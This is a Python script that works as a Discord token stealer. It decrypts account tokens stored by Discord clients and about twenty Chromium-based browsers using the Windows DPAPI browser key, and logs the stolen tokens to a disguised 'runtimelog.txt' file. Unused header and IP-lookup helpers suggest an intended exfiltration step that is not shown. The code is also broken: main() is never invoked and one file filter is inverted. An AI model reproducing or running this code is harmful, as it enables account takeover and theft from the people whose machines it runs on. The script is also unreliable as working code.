def run():
    import os
    import subprocess
    import sys
    import json
    import urllib.request
    import re
    import base64
    import datetime
    user=os.getlogin()
    def install_import(modules):
        for module, pip_name in modules:
            try:
                __import__(module)
            except ImportError:
                subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name])
                os.execl(sys.executable, sys.executable, *sys.argv)

    install_import([("win32crypt", "pypiwin32"), ("Crypto.Cipher", "pycryptodome")])

    import win32crypt
    from Crypto.Cipher import AES

    LOCAL = os.getenv("LOCALAPPDATA")
    ROAMING = os.getenv("APPDATA")
    PATHS = {
        'Discord': ROAMING + '\\discord',
        'Discord Canary': ROAMING + '\\discordcanary',
        'Lightcord': ROAMING + '\\Lightcord',
        'Discord PTB': ROAMING + '\\discordptb',
        'Opera': ROAMING + '\\Opera Software\\Opera Stable',
        'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
        'Amigo': LOCAL + '\\Amigo\\User Data',
        'Torch': LOCAL + '\\Torch\\User Data',
        'Kometa': LOCAL + '\\Kometa\\User Data',
        'Orbitum': LOCAL + '\\Orbitum\\User Data',
        'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
        '7Star': LOCAL + '\\7Star\\7Star\\User Data',
        'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
        'Chrome': LOCAL + "\\Google\\Chrome\\User Data\\Default",
        'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Default',
        'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
    }

    def getheaders(token=None):
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
        }

        if token:
            headers.update({"Authorization": token})

        return headers

    def gettokens(path):
        path += "\\Local Storage\\leveldb\\"
        tokens = []

        if not os.path.exists(path):
            return tokens

        for file in os.listdir(path):
            if not file.endswith(".ldb") and file.endswith(".log"):
                continue

            try:
                with open(f"{path}{file}", "r", errors="ignore") as f:
                    for line in (x.strip() for x in f.readlines()):
                        for values in re.findall(r"dQw4w9WgXcQ:[^\"]+", line):
                            tokens.append(values)
            except PermissionError:
                continue

        return tokens
        
    def getkey(path):
        with open(path + f"\\Local State", "r") as file:
            key = json.loads(file.read())['os_crypt']['encrypted_key']
            file.close()

        return key

    def getip():
        try:
            with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
                return json.loads(response.read().decode()).get("ip")
        except:
            return "None"

    def main():
        for _, path in PATHS.items():
            if not os.path.exists(path):
                continue

            for token in gettokens(path):
                token = token.replace("\\", "") if token.endswith("\\") else token
                token = AES.new(win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1], AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
                with open(f'C:\\Users\\{user}\\AppData\LocalLow\\runtimelog.txt', 'a') as rnt:
                    rnt.write(token)
    if __name__ == "__main__":
        run()

